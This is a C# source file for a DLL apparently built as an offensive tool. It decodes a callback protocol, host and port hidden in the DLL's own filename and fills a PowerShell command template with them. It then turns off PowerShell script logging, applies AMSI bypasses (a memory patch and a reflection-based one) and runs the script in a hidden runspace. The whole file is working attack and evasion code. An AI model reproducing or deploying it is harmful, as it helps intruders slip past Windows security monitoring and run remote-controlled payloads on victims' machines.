using System;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;

namespace HiddenPowerShellDll
{
    public class HiddenPowerShell
    {
        [DllExport]
        public static void Ruk()
        {
            if (!AttachConsole(-1))
                AllocConsole();
            
            String uri_file = Assembly.GetExecutingAssembly().GetName().CodeBase;
            //decode string
            //s = "https*192.168.1.5*8080"
            //s.each_byte.map { |b| b.to_s(16) }.join
            //68747470732a3139322e3136382e312e352a38303830
            string filenamehex = (uri_file.Split('/')[uri_file.Split('/').Length - 1]);
            filenamehex = filenamehex.Substring(0, filenamehex.Length - 4);
            
            String[] param = System.Text.Encoding.Default.GetString(Hextobyte(filenamehex)).Split('*');

            if (param.Length != 3)
            {
                Console.WriteLine("Param Number");
                return;
            }
            if (!param[0].Equals("http") && !param[0].Equals("https"))
            {
                Console.WriteLine("Param Protocol");
                return;
            }
            if (Convert.ToInt32(param[2]) < 1 || Convert.ToInt32(param[2]) > 65535)
            {
                Console.WriteLine("Param Port");
                return;
            }

            String cmd_t = HiddenPowerShellDllCommand.getPreamble();
            cmd_t += HiddenPowerShellDllCommand.getCommand();
            cmd_t = cmd_t.Replace("[proto]", param[0]);
            cmd_t = cmd_t.Replace("[host]", param[1]);
            cmd_t = cmd_t.Replace("[port]", param[2]);

            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();

            HiddenPowerShellDllLoggingEV.runBypass(rspace.GetType().Assembly);
            if(HiddePowerShellDllAmsiMemPatch.runBypass() == 1)
            {
                if(HiddenPowerShellDllAmsiEV.runBypass(rspace.GetType().Assembly) == 1)
                {
                    return ;
                }
            }

            Pipeline pipeline = rspace.CreatePipeline();
            pipeline.Commands.AddScript(cmd_t);
            pipeline.InvokeAsync();

            while (pipeline.PipelineStateInfo.State == PipelineState.Running || pipeline.PipelineStateInfo.State == PipelineState.Stopping)
            {
                System.Threading.Thread.Sleep(50);
            }

            foreach (object item in pipeline.Output.ReadToEnd())
            {
                if (item != null)
                {
                    Console.WriteLine(item.ToString());
                }
            }
        }

        public static byte[] Hextobyte(string hex)
        {
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool AllocConsole();

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool AttachConsole(int pid);
    }
}
